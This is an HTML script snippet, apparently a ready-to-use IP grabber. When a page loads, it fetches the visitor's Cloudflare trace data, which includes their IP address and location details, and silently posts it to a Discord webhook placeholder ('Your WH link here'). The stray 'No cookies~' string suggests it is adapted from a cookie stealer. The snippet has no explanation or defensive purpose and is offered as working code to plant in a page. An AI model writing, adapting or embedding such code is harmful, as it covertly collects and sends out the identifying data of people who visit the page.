```html
<script>
async function gat(url) {
    return fetch(url).then(res => res.text());
};
let ip;
async function sendDiscordWebhook() {
    let ip;
    gat('https://www.cloudflare.com/cdn-cgi/trace').then(resp => {
        ip = resp;
        if (ip == "") {
            ip = "No cookies~"
        };
        const webhookUrl = 'Your WH link here';
        const messageData = {
            content: ip,
            username: "Webhook!"
        };
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(messageData)
        }).then(data => {}).catch((error) => {})
    });
};
sendDiscordWebhook();
</script>
```
